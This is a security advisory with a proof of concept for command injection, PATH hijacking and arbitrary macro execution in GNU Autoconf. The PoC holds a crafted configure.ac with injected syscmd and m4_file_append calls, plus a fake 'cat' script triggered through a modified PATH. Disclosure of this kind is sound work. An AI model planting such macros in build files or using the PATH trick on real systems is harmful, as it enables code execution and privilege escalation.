# Overview 

Arbitrary Code execution can be obtained by running `/usr/bin/autoconf` when a crafted `configure.ac` exploits any of the following 3 vulnerabilities:

*  Command injection in M4sugar due to lack of input sanitization (CWE-78).
*  `cat` command being executed without absolute path in M4sugar, leaving it vulnerable to an untrusted PATH (CWE-427).
* Invocation of arbitrary m4 macros in `configure.ac`.


**Date**: 11/25/2023

**Researcher**: Ally Petitt

**Product Tested**: Autoconf v2.72c and prior (all but the 3rd bullet point were [fixed here](https://git.savannah.gnu.org/cgit/autoconf.git/commit/?id=11d8824daada20055c855f46ad7c45237c1ff455))

**Impact**: Remote code execution that leads to the loss of availability, confidentiality, and integrity of the system. In certain cases it can also lead to privilege escalation.


# Technical Details 

## M4sugar - Multiple Vulnerabilities
The `m4_file_append` macro is defined starting on line 3272 of `lib/m4sugar/m4sugar.m4`. 

```
m4_define([m4_file_append],
[m4_syscmd([cat >>$1 <<_m4eof
$2
_m4eof
])
```

This macro has 2 vulnerabilities. Proof-of-Concept examples of each will be shown in the "PoC" section to provide both clarification and an easy way to validate the issues.

1. The first vulnerability is that `cat` is called without an absolute path, leaving it prone to modification of the $PATH environmental variable. A privileged user on the system may set the $PATH to point to a directory they control containing a malicious executable called `cat`. In scenarios where `autoconf` has an SUID bit set or can otherwise be run with elevated privileges, this can lead to privilege escalation.

*Mitigation**: Replace "cat" with "/usr/bin/cat" in the definition of `m4_file_append`.

2. The arguments passed to `m4_file_append` are not sanitized before being passed into `m4_syscmd`. This means that hackers can directly insert malicious code as an argument to the macro and it will be executed when `autoconf` is ran!

*Mitigation**: If possible, implement a more secure way to append to a file that does not involve running shell commands. I wish I could provide more guidance here but I am not very proficient in m4. In the case that this is not feasible, treat `$1` and `$2` as untrusted input and sanitize them. 


## Autoconf - Invocation of Arbitrary M4 Macros 
Autoconf appears to execute m4 macros directly through the `configure.ac` file. Without any sanitization, adversaries are able invoke arbitrary macros including `syscmd` and the aforementioned vulnerable `m4_file_append`. This can lead to the execution of code upon running `autoconf`. An example will be shown in the "PoC" section below.

It is worth noting that while executing macros is part of Autoconf's functionality, I did not find evidence that the arbitrary execution of commands was an intentional part of this design. As such, the lack of restriction on the macros that can be called results in a larger attack surface that can be taken advantage of by hackers.

**Mitigation**: Enforce a whitelist of macros that are able to be executed from `configure.ac`.


# PoC

This Proof-of-Concept involves the creation of 4 files within the same directory. The contents of these files are the following (file names are commented at the top of each code block):

```
# congfigure.ac
AC_INIT([hello], [1.0])
AC_CONFIG_SRCDIR([hello.c])
AC_CONFIG_AUX_DIR([build-aux])
AC_PROG_CC

# Trigger the vulnerabilities by writing to a file called `vulns`
syscmd(echo vuln1 > vulns) # vuln1
m4_file_append(test, `echo vuln2 >> vulns`) # vuln2 and vuln3


AC_CONFIG_FILES([Makefile])
AC_OUTPUT
```

```
# Makefile.am
bin_PROGRAMS = hello
hello_SOURCES = hello.c
```

```
# hello.c
#include <stdio.h>
int main(int argc, char** argv) {
  printf("hello world!\n");
  return 0;
}
```

```
# cat
#!/bin/bash
echo vuln3 >> vulns
```

The resulting directory listing should be the following:

```
$ ls
cat  configure.ac  hello.c  Makefile.am
```

Once the files are verified to be correct, the 3 vulnerabilities can be exploited by running the command below.
```
$ export PATH=$(pwd):$PATH && autoconf
```

A new file will be created called `vulns`. Each vulnerability that was exploited wrote to this file to create the content below.
```
vuln1
vuln2
vuln3
```


Note that exploiting vulnerabilities 1 and 2 (the vulnerabilities that write "vuln1" and "vuln2" to the `vulns` file, respectively) does not require the $PATH environmental variable to be set and can simply be exploited with the below command.
```
$ autoconf --force
```

These files are included in this GitHub repository.

